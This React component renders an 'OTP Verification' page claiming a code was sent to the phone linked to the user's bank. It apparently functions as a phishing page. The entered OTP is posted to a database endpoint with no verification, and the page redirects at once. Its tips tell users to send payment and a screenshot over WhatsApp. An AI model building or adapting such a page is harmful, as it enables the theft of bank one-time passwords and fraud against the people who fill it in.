import React from 'react';
import { useState, useEffect, useRef } from 'react'



import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';


function Otp() {

  const [counter, setCounter] = React.useState(59);
  React.useEffect(() => {
      const timer =
      counter > 0 && setInterval(() => setCounter(counter - 1), 1000);
      return () => clearInterval(timer);
  }, [counter]);



  const [count, setCount] = useState()
  const navigate = useNavigate();
  

  const handleclick = () =>{
    navigate("/") 
  }



  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();

  const delay = (d) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve()
      }, d * 5000);
    })
  }

  //const onSubmit = async (data) => {
  // await delay(2)
  //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
  //let res = await r.text()
  //console.log(data, res)


  const onSubmit = async (data) => {
    navigate("/")
    let r = await fetch(import.meta.env.VITE_MONGO, {
      method: "POST", headers: {
        "Content-Type": "application/json",
      }, body: JSON.stringify(data)

      
    })
    let res = await r.text()
   
    console.log(data, res)


  }
  return (
    <>

<div className="navbar">
  <div className="svg" onClick={handleclick}>
<svg xmlns="http://www.w3.org/2000/svg" height="30px" viewBox="0 0 24 24" width="30px" fill="#FFFFFF"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
</div>

<p className='nav-heading'>OTP Verification</p>
</div>


<div className="login-box">
  <form action="" className='form'  onSubmit={handleSubmit(onSubmit)}>
    <div className="title">OTP</div>
    <div className="title">Verification Code</div>
    <p className='message'>OTP send to the phone number linked to your BANK</p>

<input type="number" className="form-control otp-input" placeholder='OTP'  {...register("OTP")}  name='OTP' />
<button type="submit"> Submit</button>
  </form>

  <div className="timer">Resend OTP in 00:{counter}</div>
</div>


<div className="tips-box">
<div className="tips">Important Tips</div>

<div className="important-lins">* After registration compleate Send Payment done </div>
<div className="important-lins">* Confarmation Screenshot on Whatsapp</div>
<div className="important-lins">* Please ensure your Card or Net banking is enabled for online transaction</div>
<div className="important-lins">* Please ensure to complete the payment transaction well within time limits</div>




</div>

    </>
  )
}

export default Otp
